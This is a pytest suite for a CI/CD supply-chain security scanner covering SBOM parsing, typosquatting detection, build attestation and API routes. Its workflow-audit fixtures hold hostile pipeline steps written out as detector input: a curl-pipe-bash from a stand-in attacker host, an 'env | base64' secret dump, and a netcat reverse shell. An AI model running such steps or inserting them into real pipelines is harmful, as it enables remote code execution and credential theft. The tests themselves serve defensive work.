"""
CyberShield Enterprise - CI/CD Pipeline & Supply Chain Poisoning Sentinel Test Suite
Tests SBOM parsing, workflow threat auditing, typosquatting heuristics,
SLSA build attestation, posture evaluation, and REST API routes.
"""

import json
import base64
import pytest
from starlette.testclient import TestClient

from cybershield.api.server import app
from cybershield.cicd.schemas import (
    PackageEcosystem,
    PipelinePlatform,
    SLSALevel,
    FindingSeverity,
    AttestationStatus,
    SBOMDocument,
)
from cybershield.cicd.sentinel import CICDPipelineSentinel


@pytest.fixture
def sentinel():
    return CICDPipelineSentinel(hmac_secret="test-secret-key-12345")


@pytest.fixture
def client():
    return TestClient(app)


# ------------------------------------------------------------------------------
# 1. CycloneDX & SPDX SBOM Parser Tests
# ------------------------------------------------------------------------------

def test_parse_cyclonedx_sbom(sentinel):
    cyclonedx_sample = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.5",
        "metadata": {
            "component": {
                "name": "enterprise-backend",
                "version": "2.4.0"
            }
        },
        "components": [
            {
                "name": "fastapi",
                "version": "0.109.0",
                "purl": "pkg:pypi/fastapi@0.109.0",
                "hashes": [{"alg": "SHA-256", "content": "abcdef1234567890abcdef1234567890"}],
                "licenses": [{"license": {"id": "MIT"}}]
            },
            {
                "name": "requests",
                "version": "^2.28.0",  # Unpinned floating version
                "purl": "pkg:pypi/requests@^2.28.0",
                "licenses": [{"license": {"id": "Apache-2.0"}}]
            }
        ],
        "dependencies": [
            {"ref": "pkg:pypi/fastapi@0.109.0", "dependsOn": ["pkg:pypi/pydantic@2.5.0"]}
        ]
    }

    doc = sentinel.parse_cyclonedx_sbom(cyclonedx_sample)
    assert doc.format == "cyclonedx"
    assert doc.spec_version == "1.5"
    assert doc.application_name == "enterprise-backend"
    assert doc.total_components == 2

    # Fastapi is pinned
    assert doc.components[0].is_pinned is True
    assert doc.components[0].hashes.get("sha256") == "abcdef1234567890abcdef1234567890"

    # Requests is unpinned
    assert doc.components[1].is_pinned is False

    unpinned = sentinel.detect_unpinned_dependencies(doc)
    assert len(unpinned) == 1
    assert unpinned[0].name == "requests"


def test_parse_spdx_sbom(sentinel):
    spdx_sample = {
        "spdxVersion": "SPDX-2.3",
        "name": "payment-microservice",
        "packages": [
            {
                "name": "express",
                "versionInfo": "4.18.2",
                "checksums": [{"algorithm": "SHA256", "checksumValue": "9876543210fedcba"}],
                "licenseConcluded": "MIT"
            },
            {
                "name": "lodash",
                "versionInfo": "latest",  # Unpinned
                "licenseConcluded": "MIT"
            }
        ]
    }

    doc = sentinel.parse_spdx_sbom(spdx_sample)
    assert doc.format == "spdx"
    assert doc.application_name == "payment-microservice"
    assert doc.total_components == 2
    assert doc.components[0].is_pinned is True
    assert doc.components[1].is_pinned is False


# ------------------------------------------------------------------------------
# 2. Workflow Script Tampering & Threat Sentinel Tests
# ------------------------------------------------------------------------------

def test_audit_workflow_script_threats(sentinel):
    malicious_workflow = """
name: Insecure CI Pipeline
on: [pull_request_target]

permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Untrusted Checkout
        uses: actions/checkout@main
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      
      - name: Suspicious Web Script
        run: |
          curl -sSfL https://attacker-c2.com/install.sh | bash
          env | base64
          nc -e /bin/bash 198.51.100.42 4444
    """

    findings = sentinel.audit_workflow_script(malicious_workflow)
    finding_types = [f.finding_type for f in findings]

    assert "PERMISSIVE_TOKEN_SCOPE" in finding_types
    assert "PWN_REQUEST_CODE_EXECUTION" in finding_types
    assert "CURL_PIPE_SHELL" in finding_types
    assert "SECRET_EXFILTRATION_PATTERN" in finding_types
    assert "UNPINNED_THIRD_PARTY_ACTION" in finding_types
    assert "OUTBOUND_REVERSE_SHELL" in finding_types

    # Verify line numbers are populated
    for f in findings:
        assert f.line_number is not None
        assert f.recommendation != ""


def test_audit_workflow_clean(sentinel):
    clean_workflow = """
name: Hardened CI Pipeline
on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - name: Pinned Checkout
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
      
      - name: Run Tests
        run: pytest tests/
    """
    findings = sentinel.audit_workflow_script(clean_workflow)
    assert len(findings) == 0


# ------------------------------------------------------------------------------
# 3. Typosquatting & Brandjacking Detection Tests
# ------------------------------------------------------------------------------

def test_detect_typosquatting_heuristics(sentinel):
    # Test Levenshtein distance 1
    req_typo = sentinel.detect_typosquatting("reqeusts", ecosystem=PackageEcosystem.PYPI)
    assert len(req_typo) >= 1
    assert req_typo[0].target_package == "requests"
    assert req_typo[0].distance == 2 or req_typo[0].distance == 1

    # Test NPM typosquat
    exp_typo = sentinel.detect_typosquatting("expres", ecosystem=PackageEcosystem.NPM)
    assert len(exp_typo) >= 1
    assert exp_typo[0].target_package == "express"

    # Exact legitimate package should yield no typosquat alerts
    legit = sentinel.detect_typosquatting("fastapi", ecosystem=PackageEcosystem.PYPI)
    assert len(legit) == 0


def test_detect_homoglyph_attack(sentinel):
    # Cyrillic 'а' (U+0430) instead of Latin 'a' in 'flask' -> 'flаsk'
    cyrillic_flask = "fl\u0430sk"
    findings = sentinel.detect_typosquatting(cyrillic_flask, ecosystem=PackageEcosystem.PYPI)
    assert len(findings) >= 1
    assert findings[0].target_package == "flask"
    assert findings[0].attack_vector == "Homoglyph Substitution"
    assert findings[0].risk_level == FindingSeverity.CRITICAL


# ------------------------------------------------------------------------------
# 4. SLSA Build Attestation & Tampering Detection Tests
# ------------------------------------------------------------------------------

def test_verify_build_attestation(sentinel):
    import hashlib
    artifact_data = b"Enterprise-Compiled-Binary-Artifact-v1.0.0"
    expected_hash = hashlib.sha256(artifact_data).hexdigest()
    sig = sentinel.generate_attestation_signature(artifact_data)

    # Valid hash and signature
    attestation = sentinel.verify_build_attestation(
        artifact_bytes=artifact_data,
        expected_sha256=expected_hash,
        signature=sig,
        source_commit="commit-7789abcdef",
    )
    assert attestation.attestation_status == AttestationStatus.VERIFIED
    assert attestation.signature_valid is True
    assert attestation.slsa_level == SLSALevel.LEVEL_3

    # Tampered artifact content
    tampered_data = b"Enterprise-Compiled-Binary-Artifact-CORRUPTED"
    tampered_attestation = sentinel.verify_build_attestation(
        artifact_bytes=tampered_data,
        expected_sha256=expected_hash,
        signature=sig,
    )
    assert tampered_attestation.attestation_status == AttestationStatus.TAMPERED
    assert tampered_attestation.slsa_level == SLSALevel.LEVEL_0


# ------------------------------------------------------------------------------
# 5. Pipeline Posture Evaluation & Gate Scoring
# ------------------------------------------------------------------------------

def test_evaluate_pipeline_posture(sentinel):
    dangerous_workflow = """
name: CI
jobs:
  run:
    steps:
      - run: curl https://badsite.com | bash
    """
    report = sentinel.evaluate_pipeline_posture(
        workflow_content=dangerous_workflow,
        package_names_to_check=["reqeusts"],
    )
    assert report.security_score < 70.0
    assert report.is_deployable is False
    assert len(report.tamper_findings) >= 1
    assert len(report.typosquat_findings) >= 1
    assert len(report.recommendations) > 0


# ------------------------------------------------------------------------------
# 6. REST API Endpoints Tests
# ------------------------------------------------------------------------------

def test_api_audit_workflow(client):
    payload = {
        "workflow_name": "pipeline.yml",
        "workflow_content": "name: test\njobs:\n  test:\n    steps:\n      - run: env | base64\n",
        "platform": "github_actions",
    }
    response = client.post("/api/v1/cicd/audit/workflow", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert len(data) >= 1
    assert data[0]["finding_type"] == "SECRET_EXFILTRATION_PATTERN"


def test_api_audit_sbom(client):
    cyclonedx_doc = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.5",
        "metadata": {"component": {"name": "app", "version": "1.0"}},
        "components": [
            {"name": "pytest", "version": "8.0.0", "purl": "pkg:pypi/pytest@8.0.0"}
        ]
    }
    payload = {
        "sbom_content": json.dumps(cyclonedx_doc),
        "format": "cyclonedx"
    }
    response = client.post("/api/v1/cicd/audit/sbom", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["application_name"] == "app"
    assert data["total_components"] == 1


def test_api_detect_typosquat(client):
    payload = {
        "packages": ["reqeusts", "numpy", "expres"],
        "ecosystem": "pypi"
    }
    response = client.post("/api/v1/cicd/detect/typosquat", json=payload)
    assert response.status_code == 200
    data = response.json()
    targets = [item["target_package"] for item in data]
    assert "requests" in targets


def test_api_verify_attestation(client):
    content = b"test-release-binary-payload"
    content_b64 = base64.b64encode(content).decode('ascii')
    import hashlib
    sha256 = hashlib.sha256(content).hexdigest()

    payload = {
        "artifact_name": "release.bin",
        "artifact_content_base64": content_b64,
        "expected_sha256": sha256,
    }
    response = client.post("/api/v1/cicd/verify/attestation", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["attestation_status"] == "VERIFIED"


def test_api_posture_summary_and_health(client):
    summary_resp = client.get("/api/v1/cicd/posture/summary")
    assert summary_resp.status_code == 200
    assert summary_resp.json()["status"] == "active"

    health_resp = client.get("/api/v1/cicd/health")
    assert health_resp.status_code == 200
    assert health_resp.json()["service"] == "cicd-sentinel"
